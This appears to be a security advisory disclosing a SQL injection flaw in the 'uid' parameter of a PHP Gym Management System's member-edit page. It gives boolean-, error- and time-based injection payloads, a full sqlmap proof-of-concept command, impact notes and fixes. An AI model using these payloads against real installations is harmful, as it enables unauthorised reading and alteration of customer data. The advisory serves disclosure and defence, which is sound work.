# **Security Advisory: SQL Injection in Gym Management System (PHP) v1.0**
  
**Discovered By:** l1nk 

---

## **1. Affected Product**
- **Product Name**: Gym Management System in PHP with Source Code  
- **Version**: v1.0  
- **Vulnerable File**: `/dashboard/admin/edit_mem_submit.php`  
- **Parameter**: `uid`  
- **Vendor Homepage**: [Gym Management System](https://codezips.com/php/gymmanagementsytem/)  
- **Download Link**: [Source Code](https://codeload.github.com/codezips/gym-management-system-php/zip/master)

**No authentication required** to exploit this vulnerability.

---

## **2. Overview**
A critical SQL injection vulnerability exists in the `uid` parameter within `/dashboard/admin/edit_mem_submit.php`. Attackers can inject arbitrary SQL code via specially crafted values, bypassing input validation. This could lead to unauthorized database access, data manipulation, and potentially full system compromise.

---

## **3. Technical Details**

### **3.1 Vulnerability Type**
- **SQL Injection**  
  - Boolean-based  
  - Error-based  
  - Time-based blind

### **3.2 Sample Payloads**

```bash

# boolean-based
uid=1529336794' OR NOT 7214=7214-- Ppqk&uname=Christiana Mayberry&gender=Male&phone=3362013747&email=christiani@gmail.com&dob=1968-04-13&jdate=2018-06-18&stname=2069  Quarry Drive&state=NC&city=Greensboro&zipcode=27409&calorie=111&height=111&weight=111&fat=11&remarks=111&submit=UPDATE

# error-based
uid=1529336794' AND GTID_SUBSET(CONCAT(0x716b787871,(SELECT (ELT(7186=7186,1))),0x717a717071),7186)-- bXqU&uname=Christiana Mayberry&gender=Male&phone=3362013747&email=christiani@gmail.com&dob=1968-04-13&jdate=2018-06-18&stname=2069  Quarry Drive&state=NC&city=Greensboro&zipcode=27409&calorie=111&height=111&weight=111&fat=11&remarks=111&submit=UPDATE


# Time-based blind 
uid=1529336794' AND (SELECT 5721 FROM (SELECT(SLEEP(5)))ngfQ)-- WrdR&uname=Christiana Mayberry&gender=Male&phone=3362013747&email=christiani@gmail.com&dob=1968-04-13&jdate=2018-06-18&stname=2069  Quarry Drive&state=NC&city=Greensboro&zipcode=27409&calorie=111&height=111&weight=111&fat=11&remarks=111&submit=UPDATE
```

### **3.3 Proof of Concept (PoC)**
```bash
sqlmap -u "172.20.10.2:2227/dashboard/admin/edit_mem_submit.php" --cookie="PHPSESSID=mrd93ill6876fpomko31optq40" --data="uid=1529336794&uname=Christiana+Mayberry&gender=Male&phone=3362013747&email=christiani%40gmail.com&dob=1968-04-13&jdate=2018-06-18&stname=2069++Quarry+Drive&state=NC&city=Greensboro&zipcode=27409&calorie=111&height=111&weight=111&fat=11&remarks=111&submit=UPDATE" --batch --level=5 --risk=3 --dbms=mysql --random-agent
```

**Screenshots**:  
<img width="1023" alt="image" src="https://github.com/user-attachments/assets/5d9554a6-df46-4f53-892e-89ecf83045b7" />


---

## **4. Impact**
- **Database Compromise**: Attackers can read, modify, or delete data.  
- **Data Leakage**: Sensitive customer/payment information could be exposed.  
- **System Interruption**: Malicious queries may degrade performance or crash the application.  
- **Privilege Escalation**: Potential elevation of privileges leading to broader system takeover.

---

## **5. Recommendations**

1. **Use Prepared Statements / Parameter Binding**  
   - Separate SQL logic from user-supplied data to prevent code injection.

2. **Enforce Strict Input Validation**  
   - Validate and sanitize incoming fields (`uid`) against unexpected characters or formats.

3. **Apply the Principle of Least Privilege**  
   - Configure database users with minimal privileges. Avoid high-privilege accounts for routine queries.

4. **Schedule Regular Security Audits**  
   - Conduct routine code reviews, penetration testing, and dependency checks to catch new or recurring flaws.

---

## **6. References**
- [Gym Management System Homepage](https://codezips.com/php/gymmanagementsytem/)  
- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)  
- [sqlmap Project](https://sqlmap.org/)

---

**Disclaimer:**  
This advisory is intended for responsible disclosure. Any unauthorized exploitation of the described vulnerability may violate applicable laws. Stakeholders and the vendor are strongly encouraged to apply remediation measures immediately to ensure data protection and maintain system integrity.
